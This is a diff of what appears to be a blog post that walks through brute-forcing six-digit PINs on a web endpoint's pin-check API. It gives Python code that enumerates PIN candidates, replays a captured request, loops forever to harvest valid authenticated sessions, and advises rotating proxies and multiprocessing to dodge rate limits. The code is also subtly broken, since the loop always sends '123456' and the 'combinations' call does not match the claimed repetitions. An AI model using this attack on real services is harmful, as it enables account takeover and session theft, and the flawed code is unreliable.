@@ -37,17 +37,11 @@ With this i can generate 5005 pins that could be tried that have repetitions i.e
 I can generate the combinations with repetitions using python math module as below
 
 ```python
-
 >>> from itertools import combinations
-
 >>> n = range(10)
-
 >>> r = 6
-
 >>> values = list(combinations(n, r))
-
 >>> possible_pins = ["".join(map(lambda x: str(x), item)) for item in values]
-
 >>> possible_pins
 
 ['012345', '012346', '012347', '012348', '012349', '012356', '012357', '012358', '012359', '012367', '012368', '012369', '012378', '012379', '012389', '012456', '012457', '012458', '012459', '012467', '012468', '012469', '012478', '012479', '012489', '012567', '012568', '012569', '012578', '012579', '012589', '012678', '012679', '012689', '012789', '013456', '013457', '013458', '013459', '013467', '013468',...'356789', '456789']
@@ -63,13 +57,9 @@ I made a network trace when i hit submit button using a random 6 digit pin and s
 I can now use this network call to make a request using python requests module as below
 
 ```python
-
 >>> import requests
-
 >>> session = requests.Session()
-
 >>> response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
-
 >>> response
 
 <Response [401]>
@@ -79,17 +69,11 @@ I can now use this network call to make a request using python requests module a
 Now i will go ahead and try to use all the pins that i have to see if any pin is active and i can use it. I modified the above code to match my needs
 
 ```python
-
 >>> successful_attacks = {}
-
 >>> for pin in possible_pins:
-
 >>>     session = requests.Session()
-
 >>>     response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
-
 >>>     if response.status_code == requests.codes.ok:
-
 >>>         successful_attacks[pin] = session
 
 ```
@@ -99,27 +83,16 @@ The above code will find an active/valid pin during the time of request. I want 
 I will just put a while loop to do so.
 
 ```python
-
 >>> def attack() -> dict:
-
 >>>     successful_attacks = {}
-
 >>>     for pin in possible_pins:
-
 >>>         session = requests.Session()
-
 >>>         response = session.post("https://xyz.com/account/pin-check", json={"pin": "123456"})
-
 >>>         if response.status_code == requests.codes.ok:
-
 >>>             successful_attacks[pin] = session
-
 >>>     return successful_attacks
-
 >>> successful_sessions = []
-
 >>> while True:
-
 >>>     successful_sessions += attack().values()
 
 ```
@@ -128,11 +101,11 @@ Once the above code runs forever i will get all the successful sessions that i c
 
 # Problems that we have to address along the way
 
-#### Too many requests from the same ip address can result in blocked network calls
+### Too many requests from the same ip address can result in blocked network calls
 
 To resolve this we can use proxy ip addresses to make anonymized network calls using requests
 
-#### Time consumed for each attack with series of requests one after another
+### Time consumed for each attack with series of requests one after another
 
 Now this is a good problem that i want to solve. If each request will take n seconds on an average, then it will take n * 5005 seconds for each attack. There is a possibility that a pin was created and expired during this time. So we have to be fast. To resolve this we can use multi processing or distributed task processing to distribute 5005 tasks evenly so that the results were generated instantly without having to wait on others.
 
